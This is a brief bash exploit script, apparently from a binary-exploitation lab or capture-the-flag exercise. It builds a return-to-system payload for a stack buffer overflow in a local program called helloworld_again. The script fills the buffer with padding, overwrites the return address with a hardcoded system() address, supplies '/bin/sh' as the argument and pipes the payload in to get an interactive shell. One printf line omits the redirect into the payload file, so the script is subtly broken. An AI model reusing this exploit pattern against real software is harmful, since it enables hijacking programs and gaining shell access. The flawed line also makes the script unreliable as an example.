#!/bin/bash

if [[ -e payload_2 ]]; then
    rm payload_2
fi

printf 'a%.0s' {1..56} > payload_2 # 48+8 times a, rewrite 48 bytes of local var and frame point rbp
printf "\xc0\x10\x40\x00\x00\x00\x00\x00" >> payload_2 # function's pointer of system()
printf 'a%.0s' {1..4} >> payload_2
printf "\x5D\xE4\xFF\xFF\xFF\xFF\xFF\x7F" # 1th parameter of system(), rsp + 56 + 4 + 8 + 1
printf "/bin/sh\0" >> payload_2 # 1th parameter of system()

cat payload_2 - | ./helloworld_again
